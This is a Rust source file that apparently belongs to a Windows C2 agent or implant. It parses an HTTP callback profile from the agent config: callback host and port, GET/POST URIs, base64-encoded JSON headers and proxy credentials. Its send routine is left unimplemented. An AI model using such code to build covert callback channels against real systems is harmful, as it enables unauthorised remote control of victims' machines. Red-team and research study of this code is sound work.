use std::collections::HashMap;

use windows::core::HSTRING;

use crate::{
    config::Config,
    crypto::base64,
    profiles::{
        errors::{HttpConfigError, HttpProfileError},
        ConfigProxyInfo,
    },
};

#[allow(dead_code)]
struct ProxyInfo {
    host: HSTRING,
    user: Option<HSTRING>,
    password: Option<HSTRING>,
}

#[allow(dead_code)]
pub struct HttpProfile {
    useragent: Option<HSTRING>,
    proxy_info: Option<ProxyInfo>,
    get_uri: HSTRING,
    post_uri: HSTRING,
    query_path_name: HSTRING,
    host: HSTRING,
    port: u16,
    tls: bool,
    systemproxy: bool,
    headers: Option<HSTRING>,
}

impl HttpProfile {
    pub fn configure(agent_config: &Config) -> Result<HttpProfile, HttpConfigError> {
        let mut http_headers: Option<HashMap<String, String>> = agent_config
            .headers
            .as_ref()
            .map(|headers| {
                base64::decode(headers)
                    .map_err(|_| HttpConfigError::HeadersBase64Invalid)
                    .map(|json_headers| {
                        serde_json::from_slice(&json_headers)
                            .map_err(|_| HttpConfigError::HeadersJsonInvalid)
                    })
            })
            .transpose()?
            .transpose()?;

        let useragent = http_headers
            .as_mut()
            .and_then(|headers| headers.remove("User-Agent").map(|ua| HSTRING::from(ua)));

        let headers = http_headers.filter(|hmap| !hmap.is_empty()).map(|headers| {
            HSTRING::from(
                headers
                    .into_iter()
                    .map(|(key, val)| format!("{}: {}\r\n", key, val).to_string())
                    .collect::<String>()
                    .trim_end_matches("\r\n"),
            )
        });

        let proxy_info = agent_config
            .proxy_info
            .as_ref()
            .map(|proxy_info| {
                base64::decode(proxy_info)
                    .map_err(|_| HttpConfigError::ProxyInfoBase64Invalid)
                    .map(|proxy_info| {
                        serde_json::from_slice::<ConfigProxyInfo>(&proxy_info)
                            .map_err(|_| HttpConfigError::ProxyInfoJsonInvalid)
                            .map(|info| ProxyInfo {
                                host: HSTRING::from(format!("{}:{}", info.host, info.port)),
                                user: info.user.map(|user| user.into()),
                                password: info.password.map(|password| password.into()),
                            })
                    })
            })
            .transpose()?
            .transpose()?;

        let tls = agent_config.callback_host.starts_with("https://");
        let host: HSTRING = if tls {
            agent_config.callback_host.trim_start_matches("https://")
        } else {
            agent_config.callback_host.trim_start_matches("http://")
        }
        .into();

        Ok(HttpProfile {
            get_uri: agent_config.get_uri.as_str().into(),
            post_uri: agent_config.post_uri.as_str().into(),
            query_path_name: agent_config.query_path_name.as_str().into(),
            port: agent_config.callback_port,
            systemproxy: agent_config.systemproxy,
            useragent,
            proxy_info,
            tls,
            host,
            headers,
        })
    }

    pub fn send_data(&self, _data: &[u8]) -> Result<Vec<u8>, HttpProfileError> {
        todo!();
    }
}
